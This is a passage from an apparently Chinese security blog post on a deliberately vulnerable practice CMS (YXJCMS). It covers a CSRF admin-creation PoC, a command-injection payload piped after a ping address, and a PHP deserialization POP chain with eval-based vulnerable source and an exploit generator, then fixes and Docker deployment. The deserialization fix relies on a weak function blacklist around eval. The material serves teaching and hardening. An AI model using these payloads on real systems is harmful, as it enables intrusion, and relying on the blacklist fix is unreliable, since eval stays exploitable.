<p>POC如下：</p>
<p><img src="/2020/06/09/YXJCMS/814d5858a4f0cf403151a9ce240b3971.png" alt></p>
<p>然后诱使管理员点击我们构造的页面：  </p>
<p><img src="/2020/06/09/YXJCMS/6f0f93d5bf409a356c588dd15858ab45.png" alt="在这里插入图片描述"></p>
<p>再次查看可以看到已经成功添加了我们构造的管理员账户csrf：</p>
<p><img src="/2020/06/09/YXJCMS/e6b85f94cb2c9702358dd3f762218118.png" alt="在这里插入图片描述"></p>
<h3 id="2-8-2-代码分析"><a href="#2-8-2-代码分析" class="headerlink" title="2.8.2 代码分析"></a>2.8.2 代码分析</h3><p>漏洞代码位于YXJCMS\application\admin\view\manager\add.html：</p>
<p><img src="/2020/06/09/YXJCMS/5fb2a971acfd3e96a932c4065403b384.png" alt></p>
<p>在提交的表单中没有任何验证方式，服务端也没有对表单的重复性进行验证，如使用csrf token等，这就导致了攻击者可以构造同样请求的表单，再利用管理员的身份验证凭证造成CSRF攻击，伪造管理员做出请求。</p>
<h2 id="2-9-命令注入"><a href="#2-9-命令注入" class="headerlink" title="2.9 命令注入"></a>2.9 命令注入</h2><h3 id="2-9-1-漏洞复现"><a href="#2-9-1-漏洞复现" class="headerlink" title="2.9.1 漏洞复现"></a>2.9.1 漏洞复现</h3><p>命令注入漏洞位于管理员后台的“服务器状态”功能处，管理员可以通过输入目标ip地址，然后服务端会对该ip地址进行ping操作，并返回结果。而攻击者可以通过闭合前面的命令语句并利用管道符任意执行命令，造成命令注入。</p>
<p>如使用payload：<code>127.0.0.1\|ls /</code></p>
<p><img src="/2020/06/09/YXJCMS/34420b9304920d9573e13e360ba29b9f.png" alt></p>
<p>可以看到成功执行了ls /语句列出来根目录下的文件。</p>
<h3 id="2-9-2-代码分析"><a href="#2-9-2-代码分析" class="headerlink" title="2.9.2 代码分析"></a>2.9.2 代码分析</h3><p>漏洞代码位于YXJCMS\application\admin\controller\Ping.php处：</p>
<p><img src="/2020/06/09/YXJCMS/9eb8024f1eb981d0f8a04299e2cd3e16.png" alt></p>
<p>代码对于传入的\$target参数没有进行任何过滤和限制，直接拼接到了ping命令语句的后面，这样就导致攻击者可以利用Linux下的管道符执行自己的恶意命令，从而造成命令注入漏洞。</p>
<h2 id="2-10-反序列化"><a href="#2-10-反序列化" class="headerlink" title="2.10 反序列化"></a>2.10 反序列化</h2><h3 id="2-10-1-漏洞复现"><a href="#2-10-1-漏洞复现" class="headerlink" title="2.10.1 漏洞复现"></a>2.10.1 漏洞复现</h3><p>对于反序列化漏洞，由于不好结合到实际功能中，因此在管理员后台单独实现该漏洞的页面，如下：  </p>
<p><img src="/2020/06/09/YXJCMS/0799c9e80381a7fce9ceed4198500f8d.png" alt="在这里插入图片描述"></p>
<p>构造的反序列化payload如下：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:29</span><span class="selector-pseudo">:"app</span>\<span class="selector-tag">admin</span>\<span class="selector-tag">controller</span>\<span class="selector-tag">start_gg</span>"<span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"mod1"</span>;<span class="attribute">O</span>:<span class="number">25</span>:<span class="string">"app\admin\controller\Call"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"mod1"</span>;<span class="attribute">O</span>:<span class="number">26</span>:<span class="string">"app\admin\controller\funct"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"mod1"</span>;<span class="attribute">O</span>:<span class="number">25</span>:<span class="string">"app\admin\controller\func"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"mod1"</span>;<span class="attribute">O</span>:<span class="number">28</span>:<span class="string">"app\admin\controller\string1"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"str1"</span>;<span class="attribute">O</span>:<span class="number">28</span>:<span class="string">"app\admin\controller\GetFlag"</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">"cmd"</span>;<span class="attribute">s</span>:<span class="number">10</span>:<span class="string">"phpinfo();"</span>;&#125;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>提交上述payload后可以看到成功执行了phpinfo():</p>
<p><img src="/2020/06/09/YXJCMS/f43efe507c3f179e6b3e9d8bd05f7fcd.png" alt></p>
<h3 id="2-10-2-代码分析"><a href="#2-10-2-代码分析" class="headerlink" title="2.10.2 代码分析"></a>2.10.2 代码分析</h3><p>该反序列漏洞的源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">admin</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Serialize</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (request()-&gt;isPost())&#123;</span><br><span class="line">            $payload = <span class="keyword">$this</span>-&gt;request-&gt;post(<span class="string">'payload'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        unserialize($payload);</span><br><span class="line">        $code = file_get_contents(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;assign(<span class="string">'code'</span>, $code);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($test2,$arr)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $s1 = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        $s1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span> //把对象当函数调用</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">"字符串拼接"</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str1;</span><br><span class="line">    <span class="keyword">public</span> $str2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>攻击的方式是想办法调用GetFlag类的里的get_flag()方法中的eval函数，在string1类我们可以看到，只要把\$str1实例化为GetFlag类的对象，然后调用想办法调用<strong>toString()方法即可，那就找有没有地方把对象当作字符串了。往上看，func类的</strong>invoke()方法中有用.来进行字符串拼接的代码，那么只要把\$mod1实例化为string类的对象，然后再调用该<strong>invoke()方法即可，那就找有没有地方把对象当作函数来调用了。发现在funct类的</strong>call()中有\$s1();可以利用，只需要把\$mod1实例化为func类的对象，然后再调用该<strong>call()方法，那就找哪里调用了未声明的函数。再Call类中的test1()方法调用了不存在的test2()方法，所以只需要把\$mod1实例化为funct类的对象，然后再调用该test1()方法。看到在start_gg类中的</strong>destruct()方法中正好调用了test1()方法，那么只要\$mod1实例化为Call类的对象即可。想要调用start_gg类中的<strong>destruct()方法，只有实例化一个它的对象即可，这个对象在销毁时会自动调用</strong>destruct()函数。</p>
<p>根据上述思路，写出exp如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">admin</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> Call();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> funct();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> func();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> string1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $str1;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;str1 = <span class="keyword">new</span> GetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;cmd = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> start_gg();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行上述exp.php即可得到payload。</p>
<h1 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3 漏洞修复"></a>3 漏洞修复</h1><h2 id="3-1-文件包含漏洞"><a href="#3-1-文件包含漏洞" class="headerlink" title="3.1 文件包含漏洞"></a>3.1 文件包含漏洞</h2><p>对于文件包含漏洞的修复方式，一种是避免不必要的文件包含或者是直接将要包含的文件名写死在代码中。另一种就是采取白名单的方式，将需要包含的文件名放在一个白名单中，当进行文件包含前，先判断要包含的文件名是否出现在白名单内，若未出现在白名单中，则不允许包含。</p>
<p>这样采取白名单限制的方式，可以说是一种比较安全的修复方式了，具体修复代码如下：</p>
<p><img src="/2020/06/09/YXJCMS/493b5331866eadc1ce0ab7ff7c1e752d.png" alt></p>
<h2 id="3-2-SSRF"><a href="#3-2-SSRF" class="headerlink" title="3.2 SSRF"></a>3.2 SSRF</h2><p>对于SSRF的修复主要是对传入的\$url参数进行一定的限制和过滤，过滤主要在下面三部分：</p>
<ul>
<li><p>限制只允许使用http和https两种协议。</p>
</li>
<li><p>不允许url的host为内网ip地址。</p>
</li>
<li><p>传入的\$url必须符合正常的url格式，</p>
</li>
</ul>
<p>因此我们编写check_inner_ip函数对\$url进行验证：</p>
<p><img src="/2020/06/09/YXJCMS/004f56e2ef51e8d6940d3cb77da1f2c7.png" alt></p>
<h2 id="3-3-XXE"><a href="#3-3-XXE" class="headerlink" title="3.3 XXE "></a>3.3 XXE </h2><p>在不影响使用的情况下，应该考虑在PHP的配置中禁止外部实体的引用，以防止由于实体的引入而导致的文件任意读取、拒绝服务攻击等后果。具体的，可以修改如下的配置：libxml_disable_entity_loader(true);</p>
<p><img src="/2020/06/09/YXJCMS/839d39e4ea8ac99d1bcd6df67b82045b.png" alt></p>
<p>这样即可以防止攻击者通过XXE漏洞读取的内部文件。</p>
<h2 id="3-4-弱口令"><a href="#3-4-弱口令" class="headerlink" title="3.4 弱口令"></a>3.4 弱口令</h2><p>对于弱口令的修复与防御主要在于加强用户或管理员的安全意识，让他们对设置的密码进行隐藏，并且经常修改密码。</p>
<p>而从系统方面也可以在注册的时候，就限制密码的长度或者必须包含字符等要求，但是过于复杂的密码也不便于用户的记忆，因此应该权衡好安全性与用户体验直接的平衡关系。</p>
<h2 id="3-5-存储型XSS"><a href="#3-5-存储型XSS" class="headerlink" title="3.5 存储型XSS"></a>3.5 存储型XSS</h2><p>对于XSS的防御比较直接，只需要对相应的字符进行转移即可，在这里我们可以使用PHP中自带的htmlspecialchars()函数对传入的title进行处理，转移其中的特殊字符：</p>
<p><img src="/2020/06/09/YXJCMS/b2a9ee02c3c755b5e5b1595b8f4aaf7e.png" alt></p>
<h2 id="3-6-文件上传漏洞"><a href="#3-6-文件上传漏洞" class="headerlink" title="3.6 文件上传漏洞"></a>3.6 文件上传漏洞</h2><p>由于本Web应用系统本身已经对文件上传进行了一定的限制，问题主要出在管理员有权限将php文件加到运行上传文件列表中。但实际上，我们要做的是即使是管理员将php设置为运行上传，系统依旧不接受php文件。</p>
<p>修复代码如下，在其他过滤条件的基础上，对后缀为php的文件进行了限制，并返回“禁止上传非法文件”：</p>
<p><img src="/2020/06/09/YXJCMS/03f67a30fbdb068c1fcd70ee6911a067.png" alt></p>
<h2 id="3-7-SQL注入"><a href="#3-7-SQL注入" class="headerlink" title="3.7 SQL注入"></a>3.7 SQL注入</h2><p>对于SQL注入最直接的修复方式，就是禁止一切的sql语句直接拼接，而是使用ThinkPHP为我们提供好的操作数据库的类，这样避免了对SQL语句的直接操作，即方便了使用，也增加了安全性与可移植性。</p>
<p>除此之外，在对于id参数进行查询的时候，因为id为数字，所以我们可以通过id/d的方式，将接收的参数转换为整型进行操作，这样可以进一步限制攻击，增加安全性：</p>
<p><img src="/2020/06/09/YXJCMS/a760afb446ceabaddf1f6dd85913db63.png" alt></p>
<h2 id="3-8-CSRF"><a href="#3-8-CSRF" class="headerlink" title="3.8 CSRF"></a>3.8 CSRF</h2><p>对于CSRF的修复主要在于我们需要对每次传递到后端的表单进行验证，判断其不是攻击者构造或重放的请求。通常的修复方式是在前端表单每次提交的时候为其加上一个随机的token参数，然后服务端在解析收到的表单前，对这个token进行验证，验证通过才可以进行下一步操作，否则则判断这个表单请求是不可信的。</p>
<p>前端修复代码如下，加上了随机参数<strong>token</strong>:  </p>
<p><img src="/2020/06/09/YXJCMS/2511d1192c0ef32926a7a2afd50d5f12.png" alt></p>
<p>后端还需要对该token进行验证：</p>
<p><img src="/2020/06/09/YXJCMS/b6788d6cdd44ab65c4e586101475c23c.png" alt></p>
<p>如果收到的<strong>token</strong>与生成的不一致，则返回token验证失败，表单不被接受。</p>
<h2 id="3-9-命令注入"><a href="#3-9-命令注入" class="headerlink" title="3.9 命令注入"></a>3.9 命令注入</h2><p>原来的命令执行前未对传入的参数进行任何的过滤，而我们的修复代码可以使用PHP中自带的两个过滤函数：</p>
<ul>
<li><p>escapeshellarg()：把字符串转码为可以在 shell 命令里使用的参数。</p>
</li>
<li><p>escapeshellcmd()：对字符串中可能会欺骗 shell<br>命令执行任意命令的字符进行转义。</p>
</li>
</ul>
<p>通过这两个函数结合使用，攻击者无法利用拼接的方式加入自己的恶意命令，从而对命令执行漏洞进行了修复：</p>
<p><img src="/2020/06/09/YXJCMS/f750d2be5247ea82c185b610e04c1f0d.png" alt></p>
<h2 id="3-10-反序列化"><a href="#3-10-反序列化" class="headerlink" title="3.10 反序列化"></a>3.10 反序列化</h2><p>对于反序列化漏洞来说，没有特别针对的防御与修复方式，唯一安全的架构模式是不接受来自不受信源的序列化对象，或使用只允许原始数据类型的序列化，即尽量不要直接反序列化用户传入的序列化串。其次是尽量不要使用eval、system等PHP敏感函数，或者函数的参数不可控。如果不能满足上述情况，那么就需要对传入敏感函数的参数进行严格的过滤，如不允许传入命令执行有关的操作，只允许传入我们指定的操作。</p>
<p>修复后的反序列化代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">admin</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Serialize</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (request()-&gt;isPost()) &#123;</span><br><span class="line">            $payload = <span class="keyword">$this</span>-&gt;request-&gt;post(<span class="string">'payload'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        unserialize($payload);</span><br><span class="line">        $code = file_get_contents(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;assign(<span class="string">'code'</span>, $code);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($test2, $arr)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $s1 = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        $s1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">"字符串拼接"</span> . <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str1;</span><br><span class="line">    <span class="keyword">public</span> $str2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blacklist = [<span class="string">'phpinfo'</span>, <span class="string">'dl'</span>, <span class="string">'exec'</span>, <span class="string">'system'</span>, <span class="string">'passthru'</span>, <span class="string">'popen'</span>, <span class="string">'pclose, proc_open'</span>, <span class="string">'proc_nice'</span>, <span class="string">'leak'</span>,</span><br><span class="line">            <span class="string">'proc_terminate'</span>, <span class="string">'proc_get_status'</span>, <span class="string">'proc_close'</span>, <span class="string">'apache_child_terminate'</span>, <span class="string">'escapeshellcmd'</span>, <span class="string">'shell_exec'</span>,</span><br><span class="line">            <span class="string">'crack_check'</span>, <span class="string">'crack_closedict'</span>, <span class="string">'crack_getlastmessage'</span>, <span class="string">'crack_opendict'</span>, <span class="string">'psockopen'</span>, <span class="string">'symlink'</span>,</span><br><span class="line">            <span class="string">'ini_restore'</span>, <span class="string">'posix_getpwuid'</span>, <span class="string">'pfsockopen'</span>, <span class="string">'file_get_contents'</span>, <span class="string">'file_put_contents'</span>, <span class="string">'readfile'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="keyword">$this</span>-&gt;cmd, $blacklist)) &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用黑名单过滤的方式，对传入的\$cmd进行过滤，若只有其不在黑名单的敏感函数操作中时才能执行eval函数，这样就避免了攻击者利用反序列化进行命令执行、文件读取等危险操作，一定程度上防御了反序列化漏洞。</p>
<h1 id="4-docker部署"><a href="#4-docker部署" class="headerlink" title="4 docker部署"></a>4 docker部署</h1><h2 id="4-1-安装docker"><a href="#4-1-安装docker" class="headerlink" title="4.1 安装docker"></a>4.1 安装docker</h2><p>在ubuntu中可以使用apt-get的方式进行安装，具体安装命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># step 1: 安装必要的一些系统工具</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get -y install apt-transport-https ca-certificates curl software-properties-common</span><br><span class="line"><span class="comment"># step 2: 安装GPG证书</span></span><br><span class="line">curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line"><span class="comment"># Step 3: 写入软件源信息</span></span><br><span class="line">sudo add-apt-repository <span class="string">"deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu <span class="variable">$(lsb_release -cs)</span> stable"</span></span><br><span class="line"><span class="comment"># Step 4: 更新并安装 Docker-CE</span></span><br><span class="line">sudo apt-get -y update</span><br><span class="line">sudo apt-get -y install docker-ce</span><br></pre></td></tr></table></figure>
<h2 id="4-2-安装docker-compose"><a href="#4-2-安装docker-compose" class="headerlink" title="4.2 安装docker-compose"></a>4.2 安装docker-compose</h2><p>由于本次部署不止一个服务，所以为了避免多次编写dockerfile和多次启动，选择使用docker-compose进行部署，安装过程如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装docker-compose</span></span><br><span class="line">sudo curl -L https://github.com/docker/compose/releases/download/1.25.5/docker-compose-`uname -s`-`uname -m` -o /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line"><span class="comment"># 赋予执行权限</span></span><br><span class="line">sudo chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></figure>
<h2 id="4-3-部署启动"><a href="#4-3-部署启动" class="headerlink" title="4.3 部署启动"></a>4.3 部署启动</h2><p>在部署前我们需要写相应的脚本，包括：</p>
<ul>
<li><p>PHP相关配置（php目录下）: Dockerfile、php.ini、php-fpm.conf</p>
</li>
<li><p>Nignx相关配置（nginx目录下）：conf.d目录、nginx.conf</p>
</li>
<li><p>Mysql相关配置（mysql目录下）：init.sql、my.cnf</p>
</li>
<li><p>系统源代码位于src目录下</p>
</li>
<li><p>服务部署：docker-compose.yml</p>
</li>
</ul>
<p>具体的脚本内容，可以查看相关文件。</p>
<p>部署的时候，在docker-compose.yml同目录下执行sudo docker-compose<br>up命令一键启动服务，第一次部署时由于需要下载相关的镜像所以速度比较缓慢，如下：</p>
<p><img src="/2020/06/09/YXJCMS/d0c1c548ea6a80a32858822cbc9edc06.png" alt></p>
<p>等镜像都按照完成后，以后再次使用sudo docker-compose<br>up命令启动服务时就会非常的快捷方便：</p>
<p><img src="/2020/06/09/YXJCMS/d174e3ec9c0af309a8a7fe4d02c40f9a.png" alt></p>
]]></content>
      <categories>
        <category>Project</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含漏洞总结</title>
    <url>/2019/02/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
